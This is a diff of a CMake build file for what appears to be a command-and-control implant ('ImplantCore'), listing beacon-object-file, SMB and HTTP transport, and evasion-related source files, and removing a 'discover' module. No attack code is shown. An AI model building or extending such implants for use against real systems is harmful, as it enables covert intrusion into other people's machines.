@@ -58,8 +58,6 @@ set(SOURCES
     "modules/bof.cpp"
     "modules/bof.h"
     "libs/bof_launcher_api.h"
-    "modules/discover.cpp"
-    "modules/discover.h"
     "comms/transport.h"
     "defense/winapi.h"
     "protocols/smb/smb.h"
@@ -68,7 +66,6 @@ set(SOURCES
     "protocols/http_wininet/http.h"
     "_debug/debug.cpp"
 )
-#add_executable(Implant_v01 ${SOURCES} "modules/discover.cpp" "modules/discover.h" "comms/transport.h"   "defense/winapi.h" "comms/smb.h" "comms/smb.cpp")
 
 add_library(ImplantCore STATIC
     ${SOURCES}
